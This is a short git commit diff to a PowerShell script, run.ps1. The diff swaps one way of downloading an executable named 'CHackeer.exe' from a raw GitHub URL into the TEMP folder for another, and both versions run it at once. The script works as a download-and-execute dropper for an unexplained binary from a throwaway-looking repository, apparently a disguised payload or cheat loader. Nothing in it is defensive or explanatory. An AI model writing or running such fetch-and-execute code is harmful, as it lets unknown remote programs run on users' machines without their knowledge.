d3961dcf20a0f3df6983b0a890b649dc04537bc7
fundrug35-jpg <fundrug35@gmail.com>
2026-09-09 21:00:05 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe" -OutFile "$env:TEMP\CHackeer.exe"
-Start-Process "$env:TEMP\CHackeer.exe"
+[Net.WebClient]::new().DownloadFile('https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe','$env:TEMP\CHackeer.exe')
+& "$env:TEMP\CHackeer.exe"
